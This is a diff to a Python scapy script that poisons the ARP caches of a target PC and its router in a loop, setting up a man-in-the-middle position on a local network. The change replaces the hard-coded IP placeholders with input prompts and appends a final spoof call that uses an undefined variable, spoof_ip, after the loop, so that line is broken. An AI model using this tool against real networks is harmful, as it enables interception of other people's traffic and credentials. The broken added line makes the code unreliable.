@@ -1,5 +1,9 @@
 import scapy.all as scapy
 import time
+
+target_ip = input("Insert IP of the PC")
+gateway_ip = input("Insert IP of the router")
+
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -23,9 +27,6 @@ def restore(destination_ip, source_ip):
 
 sent_packets_count = 0
 
-target_ip = "Insert IP of the PC"
-gateway_ip = "Insert IP of teh router"
-
 try:
     while True:
         spoof(target_ip, gateway_ip)
@@ -37,3 +38,5 @@ except KeyboardInterrupt:
     print("[+] Detected CTRL + C --> Resetting ARP tables.")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
+
+spoof(target_ip, spoof_ip)
